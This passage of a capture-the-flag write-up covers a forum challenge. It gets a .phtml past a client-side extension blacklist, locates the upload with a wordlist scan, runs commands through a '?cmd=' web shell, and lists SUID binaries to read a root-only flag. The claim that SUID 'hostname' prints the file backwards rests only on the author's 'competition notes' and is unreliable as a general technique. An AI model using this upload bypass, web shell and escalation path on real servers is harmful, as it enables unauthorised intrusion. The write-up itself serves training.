&gt; 管理员公告频道<br /> <br /> <h2>规则</h2><br /> 1. 友好交流，文明发帖<br /> 2. 禁止刷屏和广告<br /> 3. 分享有价值的技术内容<br /> <br /> 如有问题请联系管理员。<br /> <br /> <hr><br /> <em>Moe Forum Admin Team</em> </div> </div> </div> </main> <footer> <p>Moe Forum v1.0 &middot; Powered by SQLite</p> </footer> </div> </body> </html>
```

Check the `/admin` panel again:

```html
ADMIN:<!DOCTYPE html> <html lang="zh-CN"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>管理后台 - Moe Forum</title> <link rel="stylesheet" href="/assets/style.css"> </head> <body> <div class="container"> <header> <h1><a href="/forum.php">Moe Forum</a></h1> <p class="subtitle">A simple 交流社区</p> <nav> <a href="/forum.php">论坛</a> <a href="/announcements.php">公告</a> <a href="/share.php">用户主页</a> <a href="/new_post.php">发帖</a> <a href="/admin/">管理后台</a> <span class="user-info">admin</span> <a href="/logout.php">退出</a> </nav> </header> <main> <div class="admin-section"> <h2>管理后台</h2> <p>欢迎回来，管理员。在这里可以管理论坛公告。</p> <p>管理的智慧：找不到的时候要善用工具</p> </div> <div class="admin-section"> <h2>发布公告</h2> <p>上传 Markdown 文件来发布公告（仅支持 .md 文件）。</p> <form id="uploadForm" action="/admin/upload.php" method="POST" enctype="multipart/form-data"> <div class="form-group"> <label>公告标题</label> <input type="text" name="title" placeholder="公告标题" required> </div> <div class="form-group"> <label>选择文件</label> <input type="file" name="file" id="fileInput" accept=".md,.markdown" required> <p class="upload-info">支持格式：.md &middot; 文件将被保存在服务器并展示在公告页。</p> <div id="fileError" class="alert alert-error" style="display:none;"></div> </div> <button type="submit" class="btn">上传发布</button> </form> </div> <div class="admin-section"> <h2>已发布公告</h2> <table style="width:100%; border-collapse:collapse;"> <tr style="text-align:left; border-bottom:2px solid #c8dcc8;"> <th style="padding:8px;">标题</th> <th style="padding:8px;">文件</th> <th style="padding:8px;">时间</th> </tr> <tr style="border-bottom:1px solid #e0e8e0;"> <td style="padding:8px;">AUTO_PHTML</td> <td style="padding:8px; font-family:monospace; font-size:0.85em;">20260823_164408_81eb35f8.phtml</td> <td style="padding:8px; font-size:0.85em; color:#aaa;">2026-08-23 16:44:08</td> </tr> <tr style="border-bottom:1px solid #e0e8e0;"> <td style="padding:8px;">欢迎公告</td> <td style="padding:8px; font-family:monospace; font-size:0.85em;">welcome.md</td> <td style="padding:8px; font-size:0.85em; color:#aaa;">2026-08-23 16:13:38</td> </tr> </table> </div> </main> <footer> <p>Moe Forum v1.0 &middot; Powered by SQLite</p> </footer> </div> </body> </html> <script> (function () { var blacklist = ['php', 'php3', 'php4', 'php5', 'php7', 'phps','.htaccess'];// Same as backend var form = document.getElementById('uploadForm'); var fileInput = document.getElementById('fileInput'); var errorBox = document.getElementById('fileError'); form.addEventListener('submit', function (e) { var filename = fileInput.value; if (!filename) return; var ext = filename.split('.').pop().toLowerCase(); if (blacklist.indexOf(ext) !== -1) { e.preventDefault(); errorBox.textContent = '非法文件类型！PHP文件不允许上传。'; errorBox.style.display = 'block'; fileInput.value = ''; } else { errorBox.style.display = 'none'; } }); fileInput.addEventListener('change', function () { errorBox.style.display = 'none'; }); })(); </script>
```

A file named `20260823_164408_81eb35f8.phtml` has appeared. Use the directories found by the earlier `dirsearch` scan to look for its location:

```bash
(venv) resi@MacBook-Air db % sed 's#^#/#; s#$#/20260823_164408_81eb35f8.phtml#' dicc.txt > paths.txt

[00:53:44] 200 -    54B - /fileadmin/user_upload//20260823_164408_81eb35f8.phtml
```

The scan finds it at `/fileadmin/user_upload//20260823_164408_81eb35f8.phtml`:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have `RCE`:

```
?cmd=ls%20/

bin boot dev entrypoint.sh etc f139 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

`f139` is probably the `flag`, but trying to read it directly with `cat` returns nothing.

```
?cmd=ls%20-la%20/f139

-rwx------ 1 root root 44 Aug 23 16:13 /f139
```

Only `root` can read it, so we need to escalate privileges.

### Privilege Escalation

`sudo -l` returns nothing.

Look for `SUID` files:

```
find / -perm -u=s -type f 2>/dev/null

/usr/bin/mount /usr/bin/passwd /usr/bin/hostname /usr/bin/su /usr/bin/chsh /usr/bin/chfn /usr/bin/gpasswd /usr/bin/umount /usr/bin/newgrp /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Notice that `hostname` has `SUID root` permissions. In my competition notes, the following command reads `/f139` and returns the flag backwards:

```
?cmd=/usr/bin/hostname%20/f139

}ab35324e7676-5c6c-f96c-639e-c104ace5{ftceom
```

Reverse it to get the `flag`.

### Flag

```
moectf{5eca401c-e936-c69f-c6c5-6767e42353ba}
```
